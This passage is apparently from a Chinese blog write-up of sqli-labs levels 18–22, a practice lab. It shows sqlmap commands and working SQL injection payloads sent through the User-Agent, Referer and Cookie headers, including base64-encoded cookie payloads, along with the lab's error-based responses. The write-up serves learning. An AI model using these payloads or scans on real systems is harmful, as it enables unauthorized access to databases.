+<p>盲注手工注入最快就是用二分法，但是我是有 bp 的人！</p>
+<ol>
+<li>–risk=RISK 风险（1-4，默认 1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试；risk 3：or 语句的测试；risk 4：update 的测试</li>
+</ol>
+<hr>
+<h1 id="less-18"><a class="markdownIt-Anchor" href="#less-18">#</a> Less-18</h1>
+<p>date：2020-11-22 00:19:07</p>
+<h2 id="过程-18"><a class="markdownIt-Anchor" href="#过程-18">#</a> 过程</h2>
+<p>题目提示，Your IP ADDRESS is: 127.0.0.1，这题我会！肯定是 xff 头注入！（结果不是）</p>
+<h3 id="sqlmap-18"><a class="markdownIt-Anchor" href="#sqlmap-18">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 18.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 18.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-18"><a class="markdownIt-Anchor" href="#手工注入-18">#</a> 手工注入</h3>
+<p>既然不是 xff 头，那就看一下源码把</p>
+<p>源码中对账户密码进行了判断，必须要绕过去才能进行头注入，刚好上一题重置了密码</p>
+<p>那么就输入相应的账户密码，再在 user-agent 上注入就好啦，先来个单引号报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;, &#x27;admin&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>讲道理这里肯定是插入操作，那就是 insert 注入咯，源码确实是 insert，其实不管是什么注入，只要能大概弄 sql 语句，顺利让数据库执行我们的代码即可</p>
+<p>拿 database () 这里利用报错注入，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-18/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-18/Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出，拿到当前数据库 security：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&#x27;,1,extractvalue(1,concat(&#x27;~&#x27;,database())))#&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>后面爆字段值同 less-11，改一下 payload 即可</p>
+<h2 id="总结-18"><a class="markdownIt-Anchor" href="#总结-18">#</a> 总结</h2>
+<p>看源码，就像考试作弊，心怀愧疚～～（跃跃欲试）~~</p>
+<ol>
+<li>level 参数：</li>
+</ol>
+<blockquote>
+<p>1 &gt; 探测等级： --level 5</p>
+<p>–level 5 指的是需要执行的测试等级</p>
+<p>一共有 5 个等级（1-5） 不加 level 时，默认是 1</p>
+<p>5 级包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>
+<p>level=2 http cookie 会测试</p>
+<p>level=3 http user-agent/referer 头会测试</p>
+<p>在不能确定哪个 payload 或参数为注入点时，建议使用高的 level 值。</p>
+</blockquote>
+<hr>
+<h1 id="less-19"><a class="markdownIt-Anchor" href="#less-19">#</a> Less-19</h1>
+<p>date：2020-11-22 10:01:30</p>
+<h2 id="过程-19"><a class="markdownIt-Anchor" href="#过程-19">#</a> 过程</h2>
+<h3 id="sqlmap-19"><a class="markdownIt-Anchor" href="#sqlmap-19">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 19.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 19.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-19"><a class="markdownIt-Anchor" href="#手工注入-19">#</a> 手工注入</h3>
+<p>看标题，referer 注入，看来后面的题目都是头注入了</p>
+<p>打开 hackbar，点击 post data，输入正确的用户名密码，提示我的 referer 是啥啥啥，再次确定就是 referer 头注入</p>
+<p>不知道为啥 hackbar 同时搞 postdata 和 referer，referer 没有起作用，上 bp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;Content-Type: application/x-www-form-urlencodedContent-Length: 34Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;&lt;/font&gt;&lt;br&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;127.0.0.1&#x27;)&#x27; at line 1&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>又是 insert 操作啦，利用报错注入 extractvalue () 拿当前数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /Less-19/ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) # Content-Type: application/x-www-form-urlencodedContent-Length: 35Origin: http://www.sqli-labs.comDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheuname=admin&amp;passwd=1&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>根据输出，拿到当前数据库名 security：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;Your IP ADDRESS is: 127.0.0.1&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&lt;/font&gt;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;Your Referer is: http://www.sqli-labs.com/Less-19/&#x27;, extractvalue(1,concat(&#x27;~&#x27;,database()))) #&lt;/font&gt;&lt;br&gt;XPATH syntax error: &#x27;~security&#x27;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
+<p>后续操作同 less-11</p>
+<h2 id="总结-19"><a class="markdownIt-Anchor" href="#总结-19">#</a> 总结</h2>
+<p>sqlmap 新操作，感觉它不太行了？应该是我不太行，去百度 sqlmap 的使用姿势</p>
+<hr>
+<h1 id="less-20"><a class="markdownIt-Anchor" href="#less-20">#</a> Less-20</h1>
+<p>date：2020-11-22 10:17:02</p>
+<h2 id="过程-20"><a class="markdownIt-Anchor" href="#过程-20">#</a> 过程</h2>
+<h3 id="sqlmap-20"><a class="markdownIt-Anchor" href="#sqlmap-20">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 20.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-20"><a class="markdownIt-Anchor" href="#手工注入-20">#</a> 手工注入</h3>
+<p>先用 admin\1 登录</p>
+<p>题目给了我的 cookie：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = admin and expires: Sun 22 Nov 2020 - 11:22:50Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>
+<p>那就 cookie 注入呗，bp 抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-20/index.php HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://www.sqli-labs.com/Less-20/index.phpDNT: 1Connection: closeCookie: uname=adminUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>
+<p>cookie 后单引号开战</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27;</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>后面的 sql 橘子拿到了，就开始常规姿势闭合，拿 database ()</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&#x27; and extractvalue(1,concat(&#x27;~&#x27;,database())) # </span><br></pre></td></tr></table></figure>
+<p>输出，拿到库名 security：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: XPATH syntax error: &#x27;~security&#x27;</span><br></pre></td></tr></table></figure>
+<p>拿字段内容同 less-11</p>
+<h2 id="总结-20"><a class="markdownIt-Anchor" href="#总结-20">#</a> 总结</h2>
+<p>报错注入真好用</p>
+<p>前面写了题，后面就越写越快了，开心</p>
+<hr>
+<h1 id="less-21"><a class="markdownIt-Anchor" href="#less-21">#</a> Less-21</h1>
+<p>date：2020-11-22 10:29:18</p>
+<h2 id="过程-21"><a class="markdownIt-Anchor" href="#过程-21">#</a> 过程</h2>
+<h3 id="sqlmap-21"><a class="markdownIt-Anchor" href="#sqlmap-21">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 21.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-21"><a class="markdownIt-Anchor" href="#手工注入-21">#</a> 手工注入</h3>
+<p>老规矩，输入 17 关重置后的账户密码 admin/1</p>
+<p>题目还是 cookie 注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 11:29:55Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>
+<p>看标题是复杂版的…</p>
+<p>啊这，先试试引号，竟然不报错了！</p>
+<p>有趣</p>
+<p>看了下题目 uname 那里发生了改变，抓包发现 uname 是 YWRtaW4，改成 admin 试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&quot;</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,COERCIBLE) for operation &#x27;=&#x27;</span><br></pre></td></tr></table></figure>
+<p>说是编码集的问题，好叭我去百度<a target="_blank" rel="noopener" href="https://www.cnblogs.com/escwq/p/12264076.html">闯关秘籍了</a></p>
+<p>对 cookie 的值进行了 base64 的处理，其他和 20 关一样</p>
+<p>也就是说在注入的时候需要把注入语句搞一下编码，打开 hackbar，打开 base64 编码，输入 admin’</p>
+<p>bp 发包设置 cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4n</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>拿到后面的句子，开始闭合注入，不知为何我转义后的报错注入代码放进 payload 没有反应，换一个加密工具就好了</p>
+<p>用报错注入拿数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64转义：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=设置cookie：Cookie: uname=YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;YOUR COOKIE : uname = YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA= and expires: Sun 22 Nov 2020 - 12:30:51&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>
+<p>拿到数据库名，拿别的数据同 less-11</p>
+<h2 id="总结-21"><a class="markdownIt-Anchor" href="#总结-21">#</a> 总结</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/makenothing/article/details/81155960">base64 使用场景及原理</a></p>
+<p>base64 最早就是用来邮件传输协议中的，原因是邮件传输协议只支持 ascii 字符传递，因此如果要传输二进制文件，如：图片、视频是无法实现的。</p>
+<p>因此 base64 就可以用来将二进制文件内容编码为只包含 ascii 字符的内容。</p>
+<p>我们知道在计算机中任何数据都是按 ascii 码存储的，而 ascii 码的 128～255 之间的值是不可见字符。而在网络上交换数据时，比如说从 A 地传到 B 地，往往要经过多个路由设备，由于不同的设备对字符的处理方式有一些不同，这样那些不可见字符就有可能被处理错误，这是不利于传输的。所以就先把数据先做一个 Base64 编码，统统变成可见字符，这样出错的可能性就大降低了。</p>
+<hr>
+<h1 id="less-22"><a class="markdownIt-Anchor" href="#less-22">#</a> Less-22</h1>
+<p>date：2020-11-22 11:35:53</p>
+<h2 id="过程-22"><a class="markdownIt-Anchor" href="#过程-22">#</a> 过程</h2>
+<h3 id="sqlmap-22"><a class="markdownIt-Anchor" href="#sqlmap-22">#</a> sqlmap</h3>
+<p>bp 抓包右键 copy to file 生成 22.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 22.txt --level=5 --risk=3 --dbs --batch</span><br></pre></td></tr></table></figure>
+<p>后续同 less-11</p>
+<h3 id="手工注入-22"><a class="markdownIt-Anchor" href="#手工注入-22">#</a> 手工注入</h3>
+<p>还是用 admin\1 登录，显示 cookie，那就还是 cookie 注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0YOUR IP ADDRESS IS : 127.0.0.1DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIREYOUR COOKIE : uname = YWRtaW4= and expires: Sun 22 Nov 2020 - 12:37:26Your Login name:adminYour Password:1Your ID:8</span><br></pre></td></tr></table></figure>
+<p>看见 uname = YWRtaW4= ，那就应该还是用 base64 加密</p>
+<p>使用上一题的 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：admin&#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>
+<p>发现没有报错显示，那么说明没有闭合成功，看标题是双引号闭合，那就改一下引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：admin&quot;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iKSBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KCcsJyxkYXRhYmFzZSgpKSkgIyA=</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;) and extractvalue(1,concat(&#x27;,&#x27;,database())) # &quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>哪到后面的 sql 语句，发现只需要闭合一个双引号，不需要），开干</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">明文：admin&quot; and extractvalue(1,concat(&#x27;,&#x27;,database())) # base64：YWRtaW4iIGFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoJywnLGRhdGFiYXNlKCkpKSAjIA==</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Issue with your mysql: XPATH syntax error: &#x27;,security&#x27;</span><br></pre></td></tr></table></figure>
+<p>拿到数据库名，拿别的数据同 less-11</p>
+<h2 id="总结-22"><a class="markdownIt-Anchor" href="#总结-22">#</a> 总结</h2>
+<p>我发现 sqlmap 跑得有一点慢</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#less-1"><span class="toc-number">1.</span> <span class="toc-text"> Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.1.1.</span> <span class="toc-text"> sqlmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 手工注入：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-2"><span class="toc-number">2.</span> <span class="toc-text"> Less-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-2"><span class="toc-number">2.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-2"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-3"><span class="toc-number">3.</span> <span class="toc-text"> Less-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="toc-number">3.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-3"><span class="toc-number">3.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-3"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">3.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-4"><span class="toc-number">4.</span> <span class="toc-text"> Less-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-4"><span class="toc-number">4.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-4"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">4.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-5"><span class="toc-number">5.</span> <span class="toc-text"> Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-5"><span class="toc-number">5.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-5"><span class="toc-number">5.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-5"><span class="toc-number">5.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-5"><span class="toc-number">5.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-6"><span class="toc-number">6.</span> <span class="toc-text"> Less-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-6"><span class="toc-number">6.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-6"><span class="toc-number">6.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-6"><span class="toc-number">6.1.2.</span> <span class="toc-text"> 手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-6"><span class="toc-number">6.2.</span> <span class="toc-text"> 总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-7"><span class="toc-number">7.</span> <span class="toc-text"> Less-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-7"><span class="toc-number">7.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-7"><span class="toc-number">7.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-7"><span class="toc-number">7.1.2.</span> <span class="toc-text"> 手工注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-7"><span class="toc-number">7.1.3.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less-8"><span class="toc-number">8.</span> <span class="toc-text"> Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-8"><span class="toc-number">8.1.</span> <span class="toc-text"> 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap-8"><span class="toc-number">8.1.1.</span> <span class="toc-text"> sqlmap</span></a></li><li class="toc-item 